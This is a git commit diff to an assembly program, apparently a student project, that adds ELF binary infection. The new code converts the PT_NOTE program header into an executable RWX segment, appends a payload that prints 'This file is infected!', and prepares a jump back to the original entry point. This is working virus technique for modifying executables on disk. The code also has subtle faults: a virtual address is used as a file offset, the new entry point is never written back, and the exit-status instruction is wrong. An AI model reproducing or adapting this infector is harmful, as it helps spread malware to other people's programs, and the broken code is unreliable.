96d8f383ce48e24a058adcd8cf66479230f614ee
Nino Hamel <nino.hamel@yahoo.fr>
2024-12-08 20:29:37 +0100

    added infection

--- projet_elf.s
+++ projet_elf.s
@@ -27,6 +27,7 @@ section .data
     error_parse db 'Error when parsing the file', 0xA, 0 ; Message d'erreur du parsing
     error_parse_len equ $ - error_parse
 
+    ; Structure pour le header ELF
     struc Elf_header_struct
         .e_ident: resb 16
         .e_type: resb 2
@@ -42,7 +43,26 @@ section .data
         .e_shentsize: resb 2
         .e_shnum: resb 2
         .e_shstrndx: resb 2
-    endstruc    
+    endstruc
+
+    align 4096 ; taille d'une page
+    payload:
+        ; Instructions simples
+        db 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00    ; mov rax, 1 (lire)
+        db 0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00    ; mov rdi, 1 (stdout)
+        db 0x48, 0x8d, 0x35, 0x0c, 0x00, 0x00, 0x00    ; lea rsi, [rel msg]
+        db 0x48, 0xc7, 0xc2, 0x14, 0x00, 0x00, 0x00    ; mov rdx, msg_len
+        db 0x0f, 0x05                                   ; syscall
+        
+        db 0x48, 0xb8                                   ; movabs rax,
+    jmp_offset: dq 0                                    ; offset pour le jmp
+        db 0xff, 0xe0                                   ; jmp rax
+        
+    msg:
+        db "This file is infected!", 0xa               ; Message à afficher quand on lance le binaire
+    msg_len equ $ - msg
+        align 4096                                     ; Alignement
+    payload_len equ $ - payload         
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
@@ -52,7 +72,7 @@ section .bss
     elf_header resb 64 ; instance de elf_header_struct (à remplir avec les infos du header elf)
     program_header resb 56 ; instance de Elf64_Phdr (à remplir avec les infos du header de programme)
     fd resq 1 ; Pour sauvegarder le descripteur de fichier
-    last_load_end resq 1 ; Pour sauvegarder la fin du dernier segment LOAD
+    last_pt_load resq 1 ; Pour sauvegarder la fin du dernier segment LOAD
     phdr_offset resq 1 ; Offset des program headers
     temp_buffer resb 56 ; Buffer temporaire pour lire les program headers
 
@@ -65,6 +85,8 @@ _start:
     call read_file
     call cmp_header_elf
     call find_pt_note
+    call find_last_pt_load
+    call inject_payload
     jmp exit_program 
 
 ; Ouvrir le fichier
@@ -72,7 +94,7 @@ open_file:
     mov rax, 2                    ; numéro de syscall pour open
     mov rdi, filename             ; pointeur vers le nom du fichier
     mov rsi, 2                    ; flags : read write
-    xor rdx, rdx                ; mode : non utilisé ici
+    mov rdx, 0                ; mode : non utilisé ici
     syscall     
 
     ; Vérifie si le fichier a été ouvert avec succès
@@ -168,21 +190,19 @@ find_pt_note:
 
     movzx rcx, word [elf_header + Elf_header_struct.e_phnum]    ; rcx = nombre de program headers
 
-    ; boucle pour trouver pt_note
-    ; on regarde dans chaque program header
     search_pt_note:
         push rcx ; Sauvegarder le compteur
         
         ; Lire le program header
-        mov rax, 8          ; lseek
-        mov rdi, [fd]
-        mov rsi, [phdr_offset]
-        xor rdx, rdx        ; SEEK_SET
+        mov rax, 8          ; syscall pour lseek (changer le curseur)
+        mov rdi, [fd] 
+        mov rsi, [phdr_offset] ; offset pour le curseur
+        mov rdx, 0        ; SEEK_SET = début du fichier
         syscall
 
-        mov rax, 0          ; read
+        mov rax, 0          ; syscall pour lire
         mov rdi, [fd]
-        mov rsi, program_header
+        mov rsi, program_header  ; buffer
         movzx rdx, word [elf_header + Elf_header_struct.e_phentsize]   ; Elf64_Phdr = 56 
         syscall
 
@@ -214,6 +234,104 @@ find_pt_note:
             pop rcx  ; Restaurer la pile
             ret
 
+find_last_pt_load:
+    ; Trouver le dernier pt_load pour placer le payload
+    mov qword [last_pt_load], 0  ; Initialisation à 0
+    movzx rcx, word [elf_header + Elf_header_struct.e_phnum] ; rcx = nombre de program headers
+    mov rax, [elf_header + Elf_header_struct.e_phoff] ; rax = offset des program headers
+
+    search_segments:
+        push rcx            ; Sauvegarder le compteur
+        mov r8, rax        ; Utiliser r8 pour sauvegarder l'offset courant
+        
+        ; Lire le program header
+        mov rax, 8          ; syscall pour lseek (changer le curseur)
+        mov rdi, [fd]
+        mov rsi, r8        ; offset pour le curseur
+        mov rdx, 0        ; SEEK_SET = début du fichier
+        syscall
+
+        mov rax, 0          ; syscall pour lire
+        mov rdi, [fd]
+        mov rsi, temp_buffer ; Buffer temporaire des program headers pour trouver le last pt_load
+        mov rdx, 56         ; taille d'un program header
+        syscall
+
+        ; Vérifier si c'est PT_LOAD
+        cmp dword [temp_buffer], 1    ; 1 = PT_LOAD
+        jne next_segment
+
+        ; Calculer la fin du segment
+        mov rax, [temp_buffer + 8]    ; p_vaddr
+        add rax, [temp_buffer + 32]   ; + p_filesz
+        add rax, 0x1000              ; Ajouter une page
+        and rax, ~0xFFF              ; Alignement page
+        
+        ; Mettre à jour si c'est le plus grand
+        cmp rax, [last_pt_load]
+        jbe next_segment
+        mov [last_pt_load], rax
+
+    next_segment:
+        mov rax, r8              ; Restaurer l'offset depuis r8
+        add rax, 56              ; Taille d'un program header
+        pop rcx                  ; Récupérer le compteur
+        dec rcx                 ; Mettre à jour le compteur
+        jnz search_segments ; loop
+        ret
+
+inject_payload:
+    ; Sauvegarder point d'entrée original
+    mov rax, [elf_header + Elf_header_struct.e_entry]
+    mov [jmp_offset], rax      ; Sauvegarder l'entrée originale
+    
+    ; Calculer nouvelle adresse
+    mov rax, [last_pt_load]
+    add rax, 0x1000
+    and rax, ~0xFFF         ; Alignement sur 4K
+    mov [elf_header + Elf_header_struct.e_entry], rax ; Sauvegarder la nouvelle adresse
+
+    ; Mettre à jour PT_NOTE
+    mov dword [program_header], 1 ; 1 = PT_LOAD
+    mov dword [program_header + 4], 7 ; RWX
+    mov [program_header + 8], rax ; p_vaddr
+    mov [program_header + 16], rax ; p_offset
+    mov qword [program_header + 32], payload_len
+    mov qword [program_header + 40], payload_len
+
+    ; Écrire le nouveau program header
+    mov rax, 8                      ; syscall pour lseek (changer le curseur)
+    mov rdi, [fd]
+    mov rsi, [phdr_offset]      ; offset pour le curseur
+    mov rdx, 0                    ; SEEK_SET = curseur au début du fichier
+    syscall
+
+    mov rax, 1                      ; syscall pour écrire
+    mov rdi, [fd]           ; écrire dans le fichier
+    mov rsi, program_header
+    mov rdx, 56     ; taille du programme header
+    syscall
+
+    ; Écrire le payload à la fin
+    mov rax, 8             ; syscall pour lseek (changer le curseur)
+    mov rdi, [fd]
+    mov rsi, 0             ; offset pour le curseur
+    mov rdx, 2             ; SEEK_END = curseur à la fin du fichier
+    syscall
+
+    mov rax, 1                      ; syscall pour écrire
+    mov rdi, [fd]       ; écrire dans le fichier
+    mov rsi, payload                
+    mov rdx, payload_len           
+    syscall
+
+    ; Message de succès
+    mov rax, 1  ; syscall pour écrire
+    mov rdi, 1 ; stdout
+    mov rsi, success_msg 
+    mov rdx, success_msg_len    
+    syscall
+
 ; Terminer le programme
 exit_program:
     ; Fermer le fichier
@@ -223,7 +341,5 @@ exit_program:
 
     ; Exit
     mov rax, 60                   ; syscall pour exit
-    xor rdi, rdi                  ; statut : 0
+    xor rdi, 0                  ; statut : 0
     syscall
-    
-
